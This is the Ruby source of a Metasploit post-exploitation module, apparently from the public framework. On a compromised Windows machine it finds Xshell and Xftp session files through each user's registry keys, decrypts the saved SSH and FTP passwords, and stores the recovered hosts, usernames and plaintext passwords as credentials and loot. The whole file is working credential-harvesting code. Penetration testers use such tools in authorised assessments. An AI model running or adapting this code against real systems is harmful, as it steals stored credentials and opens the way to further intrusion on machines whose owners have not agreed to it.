##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Rex::Parser::NetSarang

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Xshell and Xftp Passwords',
        'Description' => %q{
          This module can decrypt the password of xshell and xftp,
          if the user chooses to remember the password.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-Xmanager-encrypt-password/blob/master/doc/how-does-Xmanager-encrypt-password.md']
        ],
        'Author' => [
          'Kali-Team <kali-team[at]qq.com>'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('MASTER_PASSWORD', [ false, 'If the user sets the master password, e.g.:123456']),
      ]
    )
  end

  def try_encode_file(data)
    # version 6.0 The character set of the session file will use Unicode
    # version <= 5.3 The character set of the session file will use ANSI
    if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]
      data[2..-1].force_encoding('UTF-16LE').encode('UTF-8')
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]
      data
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]
      data[2..-1].force_encoding('UTF-16BE').encode('UTF-8')
    else
      data
    end
  end

  def enable_master_passwd?(version_6_path)
    file_name = expand_path("#{version_6_path}\\Common\\MasterPassword.mpw")
    file_contents = read_file(file_name) if session.fs.file.exist?(file_name)
    if file_contents.nil? || file_contents.empty?
      return false
    end

    file = try_encode_file(file_contents)
    file.include?('EnblMasterPasswd=1')
  end

  def net_sarang_store_config(config)
    service_data = {
      address: config[:host],
      port: config[:port],
      service_name: config[:type],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def enum_session_file(path, user_profiles)
    xsh_xfp = []
    tbl = []
    print_status("Search session files on #{path}")
    xsh_xfp += session.fs.file.search(path, '*.xsh')
    xsh_xfp += session.fs.file.search(path, '*.xfp')

    # enum session file
    xsh_xfp.each do |item|
      file_name = item['path'] + session.fs.file.separator + item['name']
      file_contents = read_file(file_name)
      if file_contents.nil? || file_contents.empty?
        print_status "Skipping empty file: #{file_name}"
        next
      end

      file = try_encode_file(file_contents)
      session_type = (File.extname(file_name) == '.xsh') ? 'Xshell' : 'Xftp'

      # parser configure file
      if session_type == 'Xshell'
        version, host, port, username, password = parser_xsh(file)
      else
        version, host, port, username, password = parser_xfp(file)
      end

      # decrypt password
      if enable_master_passwd?(path)
        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD'])
      else
        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'])
      end
      plaintext = net_sarang.decrypt_string(password) if password
      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !plaintext && password
      tbl << {
        version: "#{session_type}_V" + version.to_s,
        file_name: item['name'],
        host: host,
        port: port,
        username: username,
        plaintext: plaintext,
        password: password
      }
    end
    return tbl
  end

  def run
    print_status("Gather Xshell and Xftp Passwords on #{sysinfo['Computer']}")
    profiles = grab_user_profiles
    result = []
    profiles.each do |user_profiles|
      next if user_profiles['SID'].nil?

      parent_key_6 = "HKEY_USERS\\#{user_profiles['SID']}\\Software\\NetSarang\\Common\\6\\UserData"
      parent_key_5 = "HKEY_USERS\\#{user_profiles['SID']}\\Software\\NetSarang\\Common\\5\\UserData"
      # get session file path
      net_sarang_path_6 = expand_path(registry_getvaldata(parent_key_6, 'UserDataPath'))
      net_sarang_path_5 = expand_path(registry_getvaldata(parent_key_5, 'UserDataPath'))

      # enum session file
      result += enum_session_file(net_sarang_path_5, user_profiles) if session.fs.file.exist?(net_sarang_path_5)
      result += enum_session_file(net_sarang_path_6, user_profiles) if session.fs.file.exist?(net_sarang_path_6)
    end
    columns = [
      'Type',
      'Name',
      'Host',
      'Port',
      'UserName',
      'Plaintext',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => 'Xshell and Xftp Password',
      'Columns' => columns
    )
    result.each do |item|
      tbl << item.values
      config = {
        type: item[:version].starts_with?('Xshell') ? 'ssh' : 'ftp',
        host: item[:host],
        port: item[:port].to_i,
        username: item[:username],
        password: item[:plaintext]
      }
      net_sarang_store_config(config)
    end
    print_line(tbl.to_s)
    # Only save data to disk when there's something in the table
    if tbl.rows.count
      path = store_loot('host.xshell_xftp_password', 'text/plain', session, tbl, 'xshell_xftp_password.txt', 'Xshell Xftp Passwords')
      print_good("Passwords stored in: #{path}")
    end
  end
end
